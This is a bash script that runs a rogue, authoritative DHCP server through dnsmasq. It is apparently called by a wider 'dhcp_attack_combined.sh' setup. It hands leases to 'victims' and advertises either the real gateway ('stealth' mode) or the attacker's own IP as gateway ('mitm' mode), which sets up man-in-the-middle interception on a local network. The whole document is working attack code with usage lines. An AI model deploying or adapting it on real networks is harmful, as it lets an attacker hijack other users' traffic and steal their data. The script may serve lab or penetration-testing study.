#!/usr/bin/env bash
# Rogue DHCP server (dnsmasq).
#
# Called by dhcp_attack_combined.sh — packages and MitM setup done there.
# Can also run standalone if packages already installed.
#
# Env vars (set by combined script):
#   IFACE    — network interface (default: auto-detect)
#   ROGUE_GW — gateway IP to advertise to victims
#              stealth: real gateway  |  mitm: attacker IP
#
# Standalone usage:
#   sudo ROGUE_GW=10.10.20.1 bash rogue_dhcp_server.sh          # stealth
#   sudo ROGUE_GW=10.10.20.151 bash rogue_dhcp_server.sh        # mitm

set -uo pipefail

[[ $EUID -ne 0 ]] && { echo "[ERROR] Run as root."; exit 1; }

IFACE="${IFACE:-$(ip -o -4 route show to default | awk '{print $5; exit}')}"
REAL_GW=$(ip route | awk '/default/ {print $3; exit}')
ROGUE_GW="${ROGUE_GW:-$REAL_GW}"   # default stealth (real GW) if not set
DNS=$(resolvectl dns "$IFACE" 2>/dev/null | awk '{print $4; exit}')
LEASE_RANGE="10.10.20.210,10.10.20.220,12h"

echo "[rogue] Interface : $IFACE"
echo "[rogue] Gateway   : $ROGUE_GW"
echo "[rogue] DNS       : $DNS"
echo "[rogue] Pool      : $LEASE_RANGE"

systemctl stop dnsmasq 2>/dev/null || true
pkill dnsmasq 2>/dev/null || true

exec dnsmasq \
    --no-daemon \
    --bind-interfaces \
    --interface="$IFACE" \
    --dhcp-authoritative \
    --dhcp-range="$LEASE_RANGE" \
    --dhcp-option=3,"$ROGUE_GW" \
    --dhcp-option=6,"$DNS"
